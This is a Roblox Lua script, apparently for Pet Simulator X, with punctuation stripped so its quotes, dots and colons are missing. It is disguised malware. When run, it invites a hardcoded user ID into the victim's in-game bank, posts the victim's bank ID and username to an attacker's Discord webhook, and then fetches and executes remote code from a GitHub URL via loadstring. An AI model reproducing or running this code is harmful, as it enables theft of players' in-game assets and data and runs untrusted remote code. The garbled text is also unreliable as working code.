local YourID = 3312397512
local lib = require(game.ReplicatedStorageWaitForChild('Framework')WaitForChild('Library'))
local mybanks = lib.Network.Invoke(get my banks)
lib.Network.Invoke(Invite To Bank, mybanks[1]['BUID'], YourID)
local mybanks = gameGetService(Workspace)[__THINGS][__REMOTES][get my banks]InvokeServer({})
local BankID = mybanks[1][1]['BUID']
local url = httpsdiscord.comapiwebhooks944341209026007111p3_z6CZv3PlRKVAg17ZrY470QmvHeQZQTaLJOP3ju4ca_M3bWwyP6ef-f0gdKfUs_qgS
local data = {
   [content] = abcdef,
   [embeds] = {
       {
           [title] = Someone Executed Your Script!,
           [description] = (BankID),
           [type] = rich,
           [color] = tonumber(0x7269da),
           [image] = {
               [url] = httpwww.roblox.comThumbsAvatar.ashxx=150&y=150&Format=Png&username= ..
                   tostring(gameGetService(Players).LocalPlayer.Name)
           }
       }
   }
}
local newdata = gameGetService(HttpService)JSONEncode(data)

local headers = {
   [content-type] = applicationjson
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = POST, Headers = headers}
request(abcdef)
loadstring(gameHttpGet(httpsraw.githubusercontent.comBLACKGAMER1221Pet-Simulator-XmainBK%20Pet.lua))()